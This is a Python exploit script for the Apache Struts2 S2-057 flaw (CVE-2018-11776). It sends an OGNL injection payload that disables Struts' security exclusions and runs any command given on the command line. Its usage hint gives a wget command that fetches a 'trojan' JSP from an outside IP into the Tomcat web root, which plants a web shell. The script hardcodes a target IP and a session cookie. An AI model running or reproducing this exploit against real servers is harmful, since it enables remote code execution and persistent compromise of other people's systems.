import requests
import sys
from lxml import html

class Exploit:
    def __init__(self):
        self.payload="/%24%7B%0A(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec('"+cmd+"')).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D"
    def exp(self,url,cmd):
        headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Referer':'http://96.63.216.104:8080/actionchaining/register2.action','Connection':'close','Cookie':'JSESSIONID=E25862AE388D006049EA9D3CEF12F246','Upgrade-Insecure-Requests':'1','Cache-Control':'max-age=0'}
        tturl=url+"/struts2-showcase/"+"%24%7B%0A(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec('"+cmd+"')).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D"+"/actionChain1.action"
        r=requests.get(tturl,headers=headers)
        page=r.text
        etree=html.etree
        page=etree.HTML(page)
        data=page.xpath('//footer/div[1]/p[1]/a[1]/@*')
        print(data)

if __name__=='__main__':
    print('+------------------------------------------------------------+')
    print('+ USE: python3 <filename> <url> <command>                    +')
    print('+ EXP: python3 struts2-057_command.py http://1.1.1.1:9081 id +')
    print('+ VER: Struts 2.0.4-2.3.34                                   +')
    print('+      Struts 2.5.0-2.5.16                                   +')
    print('+------------------------------------------------------------+')
    print('+ S2-057 远程执行漏洞 && CVE-2018-11776                      +')
    print('+------------------------------------------------------------+')
    if len(sys.argv)!=3:
        print("[+]ussage: http://ip:端口 cmd命令")
        print("[+]hint:wget%20-P%20/usr/local/tomcat/webapps/ROOT/%2096.63.216.104/1.jsp 下载木马")
        print("[+]===============================================================================")
        sys.exit()
    url=sys.argv[1]
    cmd=sys.argv[2]
    attack=Exploit()
    attack.exp(url,cmd)
